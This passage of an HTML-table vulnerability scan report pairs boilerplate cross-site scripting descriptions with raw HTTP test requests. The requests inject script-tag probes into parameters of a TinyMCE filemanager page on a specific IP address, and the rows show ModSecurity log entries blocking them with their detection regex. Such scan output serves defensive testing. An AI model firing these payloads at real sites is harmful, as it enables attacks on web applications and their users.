&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_0</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=&quot;&gt;&lt;script&gt;alert(852699)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=11k2mgp1b4m2nm1ckosg1d5c91
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:43</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:42 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_0. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(852699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtstqwQAW0AAHchlVIAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtstqwQAW0AAHchlVIAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366809</td><td class=xl24 width=64 >2015-03-31 19:56:11</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=&quot;&gt;&lt;script&gt;alert(181699)&lt;/script&gt;&lt;!--&amp;fldr=test/&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=l0sfi3oir5ne2d9hci1iki2uu3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:44</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:43 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(181699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtst6wQAW0AAHgzv0QAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtst6wQAW0AAHgzv0QAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366810</td><td class=xl24 width=64 >2015-03-31 19:56:57</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551ac1cc4bcfb</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=&quot;&gt;&lt;script&gt;alert(119699)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=srje4esqj9jjupogsa81nftpo6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:45</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:44 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551ac1cc4bcfb. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(119699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsuKwQAW0AAB7zKNEAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsuKwQAW0AAB7zKNEAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366812</td><td class=xl24 width=64 >2015-03-31 20:02:54</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr='&gt;&lt;script&gt;alert(990499)&lt;/script&gt;&lt;!--&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%27%3Ealert%28990499%29%2F; PHPSESSID=hment71suskkm815629u0drpv1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:47</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:45 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(990499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsuawQAW0AAHhGMtoAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsuawQAW0AAHhGMtoAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366813</td><td class=xl24 width=64 >2015-03-31 20:06:38</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551ac1cc893bd</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd=&quot;&gt;&lt;script&gt;alert(379299)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=l6p2v9ee9kbomeudh7qpt9vr36
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:48</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:47 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551ac1cc893bd. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(379299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsu6wQAW0AAHzDqsAAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsu6wQAW0AAHzDqsAAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366814</td><td class=xl24 width=64 >2015-03-31 20:07:16</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=&lt;script&gt;prompt(744899)&lt;/script/&gt;&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=kns1ufqfu2pjr47htppg9cd1o1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:49</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:48 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(744899)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsvKwQAW0AAHewA9AAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsvKwQAW0AAHewA9AAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366822</td><td class=xl24 width=64 >2015-03-31 20:17:34</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=&lt;script&gt;prompt(315199)&lt;/script/&gt;&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=prompt%28315199%29%2F; PHPSESSID=5fd4kjhaud3lfl92126ton3v91
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:50</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:49 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(315199)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsvawQAW0AAD9hYNwAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsvawQAW0AAD9hYNwAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366823</td><td class=xl24 width=64 >2015-03-31 20:20:02</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?akey=myPrivateKey</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?akey=&quot;&gt;&lt;script&gt;alert(610199)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: PHPSESSID=h45362rslrihn8ttjuq226ldg3
Connection: Close

